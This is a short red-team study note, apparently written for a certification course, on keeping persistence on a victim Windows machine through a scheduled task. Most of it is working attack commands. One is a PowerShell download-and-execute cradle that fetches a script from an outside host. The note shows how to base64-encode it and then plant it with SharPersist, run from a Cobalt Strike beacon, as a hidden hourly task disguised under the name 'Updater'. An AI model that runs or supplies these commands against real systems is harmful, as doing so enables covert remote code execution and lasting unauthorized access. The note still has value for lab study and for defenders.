
The Windows Task Scheduler allows us to create "tasks" that execute on a pre-determined trigger. We can use this for persistence on a victim. 

### 🖊️ Create scheduled task with Powershell

1) For example a payload download, we assign the string to a variable:
	`$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'`

2) Convert to base64 in unicode , using Windows
		```	[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

3) Convert to base64 in unicode , using Linux

	`set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'`

	`echo -en $str | iconv -t UTF-16LE | base64 -w 0`

4) Then you can execute the task using a tool like sharpPersist

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```
 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 14:10
🏷️ tags: #redteam #crto   

---

